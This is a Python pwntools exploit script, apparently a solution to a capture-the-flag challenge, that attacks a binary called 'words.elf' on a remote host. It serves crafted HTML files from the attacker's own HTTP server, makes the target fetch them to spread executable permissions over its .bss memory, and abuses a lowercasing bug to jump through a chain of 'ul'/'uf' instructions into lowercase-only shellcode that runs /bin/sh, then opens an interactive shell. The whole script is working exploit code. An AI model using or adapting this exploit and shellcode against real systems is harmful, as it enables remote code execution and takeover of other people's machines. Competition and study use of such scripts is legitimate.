#!/usr/bin/env python3
from pwn import *
context(arch='amd64')

HOST = 'xoxo.hack.fe-ctf.dk'
PORT = '1337'

# Put in address of this machine here
SELF_HOST = 'x.x.x.x'
SELF_PORT = 8080
SELF_ADDR = f'{SELF_HOST}:{SELF_PORT}'.encode()

elf = ELF('../words.elf')
try:
    os.mkdir('www')
except:
    pass

# `a` is identical to executable pages, which will let the X-bit "infect" a part
# of writable memory. `b` is just null-bytes which will make the infection
# spread to all of the .bss section.
write('www/a', elf.read(0x401000, 10 * 0x1000))
write('www/b', '\x00' * (10 * 0x1000))

# `g_words` is at 0x46aa00, and `handle_a` is at 0x442dab which gets lower-cased
# into 0x642dab.  Each item in `g_words` is 260B (256 for the buffer, 4 for the
# count).  Which means well end up in at character #111 in item #7439 (zero
# indexed).
#
# At this point the condition flag ZF happens to be unset so we use `jne` (which
# is 'u') to jump our way through `g_words` in order to end up in our shellcode
# which is placed in `g_links[0].value`.

html = b'x ' * 7439

# Item #7439
html += fit(
    {111: b'ul',# + 2 + 108 = 221
     221: b'ul',# + 2 + 108 = 71 (mod 260)
    }) + b' '

# Item #7440
html += fit(
    {71: b'ul', # + 2 + 108 = 181
     181: b'ul',# + 2 + 108 = 31 (mod 260)
    }) + b' '

# Item #7441
html += fit(
    {31: b'ul', # + 2 + 108 = 141
     141: b'uu',# + 2 + 117 = 0 (mod 260)
    }) + b' '

# Now we can jump two items at a time using the same two "words" over and over
jumptwo  = fit(
    {0: b'uf',
     104: b'uf',
     208: b'uf',
    }) + b' '

jumptwo += fit(
    {52: b'uf',
     156: b'uf',
    }) + b' '

html += jumptwo * ((10000 - 7442) // 2)

# Letters in the shellcode can only be lower case.
shellcode = asm('''
    mov edi, 0x6161610
    shr edi, 4
    xor al, al

    movb [rdi], al
    dec edi
    movb [rdi], 'h'
    dec edi
    movb [rdi], 's'
    dec edi
    movb [rdi], '/'
    dec edi
    movb [rdi], 'n'
    dec edi
    movb [rdi], 'i'
    dec edi
    movb [rdi], 'b'
    dec edi
    movb [rdi], '/'

    push 1
    pop rsi
    dec esi

    add al, 0x3b

    xor edx, edx

    syscall
''')

# Store the shellcode into `g_links[0].value` and also trigger the exploit with a
# fake URL-encoding, which will lowercase the handler pointer.
html += b'<a href="%s" x>' % (shellcode.ljust(254, b'a') + b'%')
write('www/c', html)

# Start serving HTTP requests
os.system(f'(cd www ; python3 -m http.server {SELF_PORT}) &')
atexit.register(lambda: os.killpg(os.getpid(), 9))
sleep(1)

sock = remote(HOST, PORT)
# sock = process('./words.elf', env={'LD_LIBRARY_PATH': os.getcwd()})

# Copy X-bit to one or more .bss pages.
sock.sendline(b'Fetch http://%s/a' % SELF_ADDR)
sleep(2)
# Write back nulls to spread the infection to all of .bss.
sock.sendline(b'Fetch http://%s/b' % SELF_ADDR)
sleep(2)

# Send shellcode and trigger exploit.
sock.sendline(b'Ignore case=yes')
sock.sendline(b'Fetch http://%s/c' % SELF_ADDR)
sleep(2)
sock.clean()

sock.interactive()
